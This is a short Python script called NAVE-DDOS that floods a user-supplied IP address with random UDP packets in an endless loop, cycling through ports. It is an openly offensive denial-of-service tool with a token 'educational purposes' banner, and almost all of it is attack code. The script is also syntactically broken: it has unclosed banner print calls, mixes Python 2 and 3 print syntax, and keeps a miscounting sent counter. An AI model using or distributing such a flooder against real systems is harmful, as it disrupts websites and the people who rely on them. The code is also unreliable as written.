# print a color green
print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
                                                                                        
print("    _           _        _       _           _  _  _  _  _  _                   _           _        _           _  _  _     _           _ "   
print("   (_) _       (_)     _(_)_    (_)         (_)(_)(_)(_)(_)(_)                 (_)         (_)     _(_)_      _ (_)(_)(_) _ (_)       _ (_) "  
print("  (_)(_)_     (_)   _(_) (_)_  (_)         (_)(_)                             (_)         (_)   _(_) (_)_   (_)         (_)(_)    _ (_)"      
print("   (_)  (_)_   (_) _(_)     (_)_(_)_       _(_)(_) _  _         _  _  _  _  _  (_) _  _  _ (_) _(_)     (_)_ (_)            (_) _ (_) "        
print("   (_)    (_)_ (_)(_) _  _  _ (_) (_)     (_)  (_)(_)(_)       (_)(_)(_)(_)(_) (_)(_)(_)(_)(_)(_) _  _  _ (_)(_)            (_)(_) _   "       
print("   (_)      (_)(_)(_)(_)(_)(_)(_)  (_)   (_)   (_)                             (_)         (_)(_)(_)(_)(_)(_)(_)          _ (_)   (_) _  "     
print("   (_)         (_)(_)         (_)   (_)_(_)    (_) _  _  _  _                  (_)         (_)(_)         (_)(_) _  _  _ (_)(_)      (_) _"    
print("   (_)         (_)(_)         (_)     (_)      (_)(_)(_)(_)(_)                 (_)         (_)(_)         (_)   (_)(_)(_)   (_)         (_)"   
print("    "                                                                                                                                         
                                                                                                                                              
# Create a Description
print "_________________________________________________________________________________"
print "|--------------------------- author :  NAVE-HACK --------------------------------| "
print "|-------------------------- TOOL NAME : NAVE-DDOS  ------------------------------| "
print "|-------------------- THIS TOOL FOR ONLY EDUCATIONAL PURPOSES -------------------| "
print "_________________________________________________________________________________"
print

ip = raw_input("Enter target website ip adrress :  ")
port = input("Enter the port number default(8080) :  ")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 100
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
